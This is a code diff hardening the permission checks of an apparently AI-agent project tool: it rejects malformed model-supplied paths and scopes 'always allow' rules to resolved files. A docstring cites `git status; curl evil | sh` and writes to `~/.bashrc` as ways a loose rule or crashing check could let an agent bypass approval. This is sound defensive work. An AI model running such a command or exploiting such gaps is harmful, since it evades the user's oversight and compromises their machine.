@@ -36,6 +36,7 @@ from __future__ import annotations
 import asyncio
 import json
 import logging
+import os
 import secrets
 import time
 from dataclasses import dataclass, field
@@ -372,30 +373,53 @@ class ProjectAgent:
             pass
 
     # -- permissions -------------------------------------------------------
-    def _inside_project(self, raw: str | None) -> bool:
-        if not raw:
+    def _inside_project(self, raw: Any) -> bool:
+        """Whether a path the model supplied is inside the writing project.
+
+        Total by construction, because it is the fence.  The tool input is
+        whatever the model sent: a list, a number, a string with a null
+        byte in it.  `Path()` raises `TypeError` or `ValueError` on those,
+        neither of which is an `OSError`, so the exception left this
+        method, left the PreToolUse hook, and the decision about whether a
+        write was allowed was never made at all.  Anything unreadable is
+        not inside the project.
+        """
+        if not raw or not isinstance(raw, (str, os.PathLike)):
             return False
         try:
             candidate = Path(raw)
             if not candidate.is_absolute():
                 candidate = self.root / candidate
             candidate = candidate.resolve()
-        except OSError:
+        except (OSError, ValueError, TypeError):
             return False
         return candidate == self.root or self.root in candidate.parents
 
-    @staticmethod
-    def _rule_for(tool_name: str, data: dict) -> str:
+    def _rule_for(self, tool_name: str, data: dict) -> str:
         """The scope an 'always allow' grants.
 
-        Scoped by the command's first word, never blanket: allowing
-        `latexmk -c` must not also allow `rm`.
+        A rule is never the bare verb.  Scoped by the command's first word
+        for a shell call, and by the file for anything that names one:
+        allowing `latexmk -c` must not also allow `rm`, and by exactly the
+        same argument, allowing a note to be written in a sibling folder
+        must not also allow a write to `~/.bashrc`.
 
         The first word only means anything if it is the whole story.  A
         shell runs `git status; curl evil | sh` as three commands, and the
         rule `Bash:git` would have covered all of them for good -- so a
         command carrying shell syntax gets a rule nothing can match, and is
         asked about every single time.
+
+        A path rule is the resolved path, so a symlink cannot present one
+        name to the card and another to the filesystem, and it does not
+        carry the tool: the writer agreed to a file being read or changed,
+        not to a particular verb, so an Edit is covered by the Write they
+        approved on the same file.
+
+        Resolving touches the disk, which is why this is no longer a
+        staticmethod.  Only the path branch does: a shell command and a
+        tool with no path both return before it, and those are the calls
+        that happen in bulk.
         """
         if tool_name == "Bash":
             command = (data.get("command") or "").strip()
@@ -403,6 +427,25 @@ class ProjectAgent:
                 return ""
             first = command.split()[0] if command else ""
             return f"Bash:{first}"
+        if tool_name in self._PATH_TOOLS:
+            raw = (
+                data.get("file_path")
+                or data.get("path")
+                or data.get("notebook_path")
+            )
+            if not raw or not isinstance(raw, (str, os.PathLike)):
+                # Nothing nameable to scope to, so nothing is remembered --
+                # and a rule is never invented for an argument that is not
+                # a path at all.
+                return ""
+            try:
+                candidate = Path(raw)
+                if not candidate.is_absolute():
+                    candidate = self.root / candidate
+                target = candidate.resolve()
+            except (OSError, ValueError, TypeError):
+                return ""
+            return f"{self._PATH_VERB.get(tool_name, 'use')}:{target}"
         return tool_name
 
     def describe(self, tool_name: str, data: dict) -> dict:
@@ -461,6 +504,16 @@ class ProjectAgent:
         "Task",
     }
     _WRITE_TOOLS = frozenset({"Write", "Edit", "MultiEdit", "NotebookEdit"})
+    #: Tools whose card names one path.  Their remembered rule is that
+    #: path, never the verb -- see `_rule_for`.
+    _PATH_TOOLS = frozenset(READING_TOOLS) | _WRITE_TOOLS
+    #: Read and write are kept apart, so approving a file being read is not
+    #: also approving it being overwritten.  Within each, the verb does not
+    #: matter: Edit and Write do the same thing to the same file.
+    _PATH_VERB = {
+        **{tool: "read" for tool in READING_TOOLS},
+        **{tool: "write" for tool in ("Write", "Edit", "MultiEdit", "NotebookEdit")},
+    }
 
     @staticmethod
     def _allow(reason: str = "") -> dict:
